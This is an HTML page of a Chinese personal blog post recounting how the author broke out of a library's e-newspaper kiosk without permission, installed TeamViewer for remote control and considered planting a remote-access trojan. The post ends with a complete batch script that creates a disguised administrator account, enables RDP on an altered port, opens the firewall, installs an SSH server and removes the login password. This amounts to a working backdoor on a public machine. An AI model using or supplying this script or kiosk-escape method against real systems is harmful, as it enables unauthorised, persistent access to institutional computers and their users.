@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    
+    <title>终端渗透记录-lib | Room of Requirement | pwn what you want</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
+    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Sirius Whiter</h5>
+          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
+            
+              <span>x</span>
+            
+              <span>u</span>
+            
+              <span>e</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>e</span>
+            
+              <span>2</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>7</span>
+            
+              <span>@</span>
+            
+              <span>o</span>
+            
+              <span>u</span>
+            
+              <span>t</span>
+            
+              <span>l</span>
+            
+              <span>o</span>
+            
+              <span>o</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/siriuswhiter" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/siriuswhiter" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        
+	
+<header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>终端渗透记录-lib</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">终端渗透记录-lib</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-06-15T02:39:25.000Z" itemprop="datePublished" class="page-time">
+  2019-06-15
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+
+
+<div class="container body-wrap">
+    <article id="post-终端渗透记录-lib"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">终端渗透记录-lib</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-06-15 10:39:25" datetime="2019-06-15T02:39:25.000Z"  itemprop="datePublished">2019-06-15</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><em>前两天复习时无聊，在图书馆看到用来读电子报纸期刊之类的终端，突发奇想想试试能不能把控制下来</em></p>
+<p>上面就是一个界面，可以选择期刊报纸之类的，第一个想法就是看能不能先把其他的应用调出来</p>
+<p>一般触控的主机，长按是相当于鼠标右键的点击的，在主页上打开右键，发现里面有全局设置</p>
+<p>再打开全局设置的话，看到了有关于flash插件播放器的问题，看样子是需要联网的，点击链接会调出浏览器，同时出现的还有加速球hhh，get！</p>
+<p>后面在尝试调用右键的时候经常会半天出不来，这时可以进到关于简介的地方，随便把一句话括起来，就会出现复制打印之类的选项</p>
+<p>选择打印会弹出小框，而且也会弹出加速球，有了加速球其实就好解决了</p>
+<p>加速器本身很难点进去，长按也没啥反应，但是加速球带着网络速度的检查，而在网速检查中，有推荐你清理垃圾的选项hhh</p>
+<p>点击清理垃圾就能够把电脑管家给召唤出来。</p>
+<p>为了能够更方便的操作，先将电脑中的teamviewer升级（ps:神奇的是之前确实是有下好的），但是没法打开，或者是打开也看不到</p>
+<p>类似于是看报的界面是置顶的，在电脑管家中找找还有什么好用的软件，之前在浏览器里下载的搜狗输入法直接被删了，或许是有检测</p>
+<p>但是看样子teamviewer之前就是用电脑管家下的，或许这里的不会被删掉，为了后面更加方便，这里下载了搜狗输入法（ps:不用问没有输入法怎么下的，毕竟榜单前列）</p>
+<p>在看电脑管家工具箱时看到了桌面整理和小Q桌面hhh，尝试使用桌面整理，下载安装完之后，突然出现了桌面hhh</p>
+<p>想打开我的电脑，但是打开就被直接关闭了，后台应该是有应用在监控文件管理器的打开（其实想看有啥东西还是挺简单的，浏览器查看本机文档完全无障碍），想开任务管理器，软键盘欲罢不能</p>
+<p>后面一通操作之后，桌面又出不来了（哭），就勉强使用小Q桌面一用，打开之前升级的teamviewer，电子邮箱不能输入（暴哭）</p>
+<p>到这一步感觉没办法的时候，索性重装一下teamviewer，bingo，远程连接ok了hhh</p>
+<p>不过这样子实在是不安全，万一到时候拿着teamviewer账号找上门就尴尬了，好在先teamviewer控制，后面带电脑过去操控就比较方便了。</p>
+<p>目前的想法，为了能够更方便地控制还不被被监控端看到，完全可以传一个远控码过去，因为没有能绕过监控的码（菜），不过应该是可以用teamviewer放到白名单然后开机自启动吧hhh。</p>
+<p>没有码只能建个新的管理员权限的用户然后开通ssh服务远程连接使用，为了方便流程写了个bat脚本,隐藏用户的方法没建成功，就在最后设置成开机不要求密码来解决每天自动开机后卡在登陆界面的问题（主要是为了方便操作，没有能够隐蔽操作，打开文件之类的都是拿teamviewer提前传好的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">net user administratore admin /add</span><br><span class="line">net user administratore /active:yes</span><br><span class="line">net user administratore /expires:never</span><br><span class="line">net localgroup Administrators administratore /add</span><br><span class="line"></span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start C:\Users\Administrator\Library\setupssh-8.0p1-2.exe </span><br><span class="line">pause</span><br><span class="line">cd C:\openSSH\bin</span><br><span class="line">mkgroup -l &gt;&gt; ..\etc\group</span><br><span class="line">mkpasswd -l &gt;&gt; ..\etc\passwd</span><br><span class="line">md home</span><br><span class="line">md home\Administrator</span><br><span class="line">md home\Administrator\.ssh</span><br><span class="line"></span><br><span class="line">echo C:\openSSH</span><br><span class="line">echo Protocol 2  &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitRootLogin no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PermitEmptyPasswords no   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PasswordAuthentication yes    &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo RSAAuthentication yes       &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo PubkeyAuthentication yes   &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">echo AuthorizedKeysFile .ssh/authorized_keys &gt;&gt;  C:\openSSH\etc\sshd_config</span><br><span class="line">net start opensshd</span><br><span class="line"></span><br><span class="line">reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home Yes</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v native /t REG_SZ /d &quot;C:\openSSH\home&quot;</span><br><span class="line">reg add HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus&quot; &quot;Solutions\Cygwin\mounts&quot; &quot;v2\/home  /v flags /t REG_DWORD /d 0x0000000a</span><br><span class="line"></span><br><span class="line">start control userpassword2</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最後更新時間：<time datetime="2019-06-18T14:25:10.974Z" itemprop="dateUpdated">2019-06-18 22:25:10</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/06/15/终端渗透记录-lib/" target="_blank" rel="external">http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/</a>
+        
+    </div>
+    <footer>
+        <a href="http://siriuswhiter.tk">
+            <img src="/img/avatar.jpg" alt="Sirius Whiter">
+            Sirius Whiter
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/&title=《终端渗透记录-lib》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/&title=《终端渗透记录-lib》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/07/06/problem-solve-tricks/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Problem Solve Tricks</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/06/08/off-by-null-more-challenge/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">off-by-null --more challenge</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        请我喝奶茶呀
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+</div>
+
+        <footer class="footer">
+    
+    <div class="top">
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Sirius Whiter &copy; 2018 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/&title=《终端渗透记录-lib》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/06/15/终端渗透记录-lib/&title=《终端渗透记录-lib》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACG0lEQVR42u3aW47DMAgF0O5/05kFdJJeIK0U+/irqvLwyQcCw+sVr+Nt5f/33vL6xsLAwHgs47hc1y/I76pekz8BAwNjH8ZZBEuumSN778XAwMA4e1yy3bO7EgwGBgbGXYzrQJnUmxgYGBhVRpLGJduapH0/qsUxMDAeyOiFyN/8/kp/AwMD41GMo7iqYTE5kkvK3Q+7wsDAWJqRB7g8ZaxutzdsgYGBsRtjkmtVm5pJyVothjEwMNZm9MJl9dv0hsMKzQkMDIzNGL3j+Lwlmd9VaEhgYGBsw5iXjkmSV202RG/BwMBYmjFP7KqhtvqEZLADAwNjB0b5otYx/aR5mYd1DAyM9Rjzg7BJeO01NcszIxgYGEsw7ipW88Oyuz5K+TUYGBgPZCQX5cf3+baqRWwhYcXAwNiAcVdjoNrgrCaOpzvBwMBYmpGXnXmCmBfG1U8TnRpiYGAswZiPR8zL1MnABwYGxg6MSROxN8iVj1zk6SYGBsY+jPmjq+MXk0D/z5UYGBibMfJhiDwprAbQcqDHwMDYgNELeXcd0uWr0NnAwMBYgnEUV2+QYtKejNgYGBhLM3phLg+vvYBbbY5iYGDswKget+VtxTw0509rfmkMDIwlGL3AVw2p94ZsDAwMjLsY83ZC9DQMDAyMOIGbj1Pkn+ZDCxMDA2M5xrwZ0Ctc87D+IaHEwMBYmjEpHXv/X3+myegYBgbGcow/OBG8KqXj1TMAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
+<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>
+
+<!-- third-party -->
+<script type="text/javascript">
+;( function( $ ) {
+
+	$( '.swipebox' ).swipebox({
+		hideCloseButtonOnMobile: true
+	});
+
+} )( jQuery );
+</script>
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+    
+</body>
+</html>
